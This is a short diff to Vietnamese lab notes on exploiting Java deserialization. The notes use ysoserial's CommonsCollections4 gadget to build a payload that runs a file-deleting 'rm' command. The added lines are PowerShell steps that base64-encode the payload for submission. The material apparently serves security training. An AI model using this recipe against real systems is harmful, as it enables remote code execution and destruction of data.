@@ -16,3 +16,7 @@
 # Dowload file ysoserial-all.jar để dùng tools (Releases)
 # java -jar ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt' > raw.bin 
 #### Lưu vào file raw.bin có thể hiện null ẩn trong payload không bị mù như trên powershell
+# Cách đọc file raw.bin
+#### Step1: $content = [System.IO.File]::ReadAllBytes("$PWD/raw.bin")
+#### Step2: $base64 = [Convert]::ToBase64String($content)
+#### Step3: Set-Content -Path payload.txt -Value $base64 -Encoding Ascii
